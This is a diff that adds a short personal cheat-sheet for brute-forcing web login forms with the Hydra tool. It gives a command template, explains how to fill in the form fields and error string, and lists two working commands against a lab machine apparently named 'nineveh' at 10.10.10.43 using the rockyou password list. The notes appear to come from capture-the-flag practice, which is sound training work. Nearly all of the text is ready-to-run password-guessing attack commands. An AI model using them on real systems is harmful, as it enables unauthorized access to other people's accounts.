@@ -1,0 +1,24 @@
+
+
+hydra <HOSTNAME> <PROTOCOL/METHOD> -m "</PATH/TO/AUTH/FILE>:<USERNAME_FIELD>=^USER^&<PASSWORD_FIELD>=^PASS^:<ERROR_MESSAGE>" -L listOfUsers.txt -P listOfPasswords.txt
+
+hostname = IP only, will NOT accept http or https at the start
+
+protocol/method will need to look for it as you find them, the two ive used so far are http-post-form and https-post-form
+
+path/to/auth/file = /department/login.php or /db/index.php
+
+username_field = get from the source of the page what the form is actually posting, it may be username, proc_login, etc etc
+
+password_field = do the same thing as the username one, grab it
+
+error_message = what comes up when you try to login and the pw is wrong? this tells hydra when you have hit a no.
+
+WORKING EXAMPLES:
+
+both of these are for nineveh
+
+hydra 10.10.10.43 https-post-form -m "/db/index.php:password=^PASS^&proc_login=^USER^:Incorrect password." -l admin -P /usr/share/wordlists/rockyou.txt -V
+
+hydra 10.10.10.43 http-post-form -m "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -l admin -P /usr/share/wordlists/rockyou.txt -V
+
